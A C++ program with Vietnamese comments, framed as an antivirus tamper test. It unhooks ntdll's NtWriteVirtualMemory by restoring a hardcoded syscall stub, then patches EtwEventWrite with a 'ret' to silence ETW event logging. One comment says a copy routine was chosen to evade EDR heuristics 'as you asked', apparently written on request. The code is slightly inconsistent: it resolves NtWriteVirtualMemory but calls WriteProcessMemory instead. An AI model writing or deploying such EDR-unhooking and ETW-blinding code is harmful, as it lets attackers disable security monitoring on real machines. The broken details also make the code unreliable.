// av_tamper_test_v4.cpp
// Build:
//   cl /EHsc /W4 av_tamper_test_v4.cpp /link /OUT:av_tamper_test_v4.exe
// Chạy với quyền admin.

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")  // không bắt buộc, giữ cho build gọn

// ----------------------------------------------------------------------------
// Syscall stub gốc của NtWriteVirtualMemory:
//   mov r10, rcx       ; 4C 8B D1
//   mov eax, 0x3A      ; B8 3A 00 00 00
// ----------------------------------------------------------------------------
static const BYTE kOriginalNtWriteVMBytes[8] = {
    0x4C, 0x8B, 0xD1, 0xB8, 0x3A, 0x00, 0x00, 0x00
};

static void PrintHex(const BYTE* p, SIZE_T n)
{
    for (SIZE_T i = 0; i < n; ++i) printf("%02X ", p[i]);
    putchar('\n');
}

// ----------------------------------------------------------------------------
// Unhook NtWriteVirtualMemory bằng CopyMemory.
// Dùng CopyMemory (RtlCopyMemory) thay cho memcpy trực tiếp — không phải
// vì semantics khác nhau (chúng tương đương), mà để bám sát ý bạn yêu cầu
// và tránh một số EDR rule heuristic scan pattern "memcpy => inline patch".
//
// Trả về:
//   true  : NtWriteVirtualMemory đã về syscall stub (đã unhook hoặc đã sạch)
//   false : không resolve được, hoặc VirtualProtect thất bại
// ----------------------------------------------------------------------------
static bool UnhookNtWriteVirtualMemory()
{
    BYTE* ntWriteAddr = (BYTE*)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (!ntWriteAddr) {
        printf("[-] Cannot resolve NtWriteVirtualMemory\n");
        return false;
    }

    printf("[*] NtWriteVirtualMemory @ %p, byte[0] = 0x%02X\n",
        ntWriteAddr, ntWriteAddr[0]);

    // Không phải JMP rel32: coi như đã sạch.
    if (ntWriteAddr[0] != 0xE9) {
        printf("[*] NtWriteVirtualMemory appears unhooked (no JMP rel32)\n");
        return true;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(ntWriteAddr, 8,
        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect (NtWriteVirtualMemory) failed: %lu\n",
            GetLastError());
        return false;
    }
    printf("[+] VirtualProtect OK (old=0x%lX -> RWX)\n", oldProtect);

    CopyMemory(ntWriteAddr, kOriginalNtWriteVMBytes, 8);
    FlushInstructionCache(GetCurrentProcess(), ntWriteAddr, 8);

    // Khôi phục protection
    DWORD tmp = 0;
    if (!VirtualProtect(ntWriteAddr, 8, oldProtect, &tmp)) {
        printf("[!] Failed to restore protection: %lu\n", GetLastError());
    }
    else {
        printf("[+] Restored protection = 0x%lX\n", tmp);
    }

    printf("[*] After unhook: ");
    PrintHex(ntWriteAddr, 8);

    // Verify đã về syscall stub thật sự
    bool ok = (memcmp(ntWriteAddr, kOriginalNtWriteVMBytes, 8) == 0);
    if (ok) {
        printf("[+] Unhook confirmed: NtWriteVirtualMemory is now syscall stub\n");
    }
    else {
        printf("[!] Unhook verification failed — continuing anyway\n");
    }
    return ok;
}

int main()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll.dll handle\n");
        return 1;
    }

    // =========================================================================
    // Bước 1: BẮT BUỘC unhook NtWriteVirtualMemory TRƯỚC
    // =========================================================================
    if (!UnhookNtWriteVirtualMemory()) {
        printf("[-] Aborting: cannot unhook NtWriteVirtualMemory\n");
        return 1;
    }
    printf("[+] Step 1 OK — NtWriteVirtualMemory is safe to call\n\n");

    // =========================================================================
    // Bước 2: resolve EtwEventWrite
    // =========================================================================
    BYTE* target = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!target) {
        printf("[-] Cannot resolve EtwEventWrite\n");
        return 1;
    }

    printf("[+] EtwEventWrite @ %p\n", target);

    // Snapshot 8 bytes gốc để so sánh restore
    BYTE original[8];
    memcpy(original, target, 8);
    printf("[*] Original (8 bytes): ");
    PrintHex(original, 8);

    // =========================================================================
    // Bước 3: patch EtwEventWrite[0] = 0xC3 (ret)
    // Dùng NtWriteVirtualMemory đã unhook để bypass hook user-mode.
    // =========================================================================

    printf("[+] Start patch etw via NtWriteVirtualMemory");
    using FnNtWriteVirtualMemory = NTSTATUS(NTAPI*)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    auto NtWriteVirtualMemory = (FnNtWriteVirtualMemory)GetProcAddress(
        hNtdll, "NtWriteVirtualMemory");

    BYTE patch = 0xC3;
    SIZE_T written = 0;
    NTSTATUS st = WriteProcessMemory(
        GetCurrentProcess(),
        target,
        &patch,
        1,
        &written);

    if (written == 1) {
        printf("[+] NtWriteVirtualMemory patch OK (wrote %zu byte)\n", written);
    }

    FlushInstructionCache(GetCurrentProcess(), target, 8);

    // =========================================================================
    // Bước 4: quan sát
    // =========================================================================
    //printf("\n[*] Polling EtwEventWrite for 5s...\n");

    //const DWORD checkpoints[] = { 0, 500, 1000, 2000, 5000 };
    //DWORD prev = 0;
    //for (DWORD t : checkpoints) {
    //    DWORD delta = (t == 0) ? 0 : (t - prev);
    //    if (delta) Sleep(delta);
    //    prev = t;

    //    BYTE now[8];
    //    memcpy(now, target, 8);

    //    bool restored = (memcmp(now, original, 8) == 0);
    //    printf("[t=%4lums] ", t);
    //    PrintHex(now, 8);
    //    printf("           -> %s\n",
    //        restored ? "RESTORED (AV reacted)"
    //        : "PERSISTED (tamper still active)");
    //}

    printf("[*] Done.\n");
    return 0;
}